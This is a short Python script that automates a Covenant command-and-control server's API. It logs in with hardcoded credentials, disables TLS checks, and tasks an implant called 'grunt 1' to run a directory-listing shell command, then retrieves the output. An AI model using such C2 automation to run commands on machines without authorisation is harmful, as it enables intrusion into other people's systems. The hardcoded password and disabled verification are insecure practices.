from time import sleep
import requests
import functools

username = 'pucara'
password = 'banana123'
base_url = "https://127.0.0.1:7443"
r1 = requests.post(
    base_url + "/api/users/login",
    json={"userName": username, "password": password},
    verify=False,
)
dic_prueba = r1.json()
token = dic_prueba["covenantToken"]
header = {"Authorization": "Bearer {} ".format(token)}
my_post = functools.partial(requests.post, verify=False, headers=header)
my_get = functools.partial(requests.get, verify=False, headers=header)


# list directories
# dir /-c/q/a/o/t:w/n 
cmd_dir = 'ShellCmd /shellcommand:"dir /-c/q/a/o/t:w/n "'
cmd_dir_result = my_post(base_url + '/api/grunts/1/interact', json=cmd_dir)

sleep(3)
commands_cmd_dir_result = my_get(base_url + '/api/commandoutputs/{}'.format(cmd_dir_result.json()['commandOutputId']))
cmd_lines= commands_cmd_dir_result.json()['output'].split('\r\n')
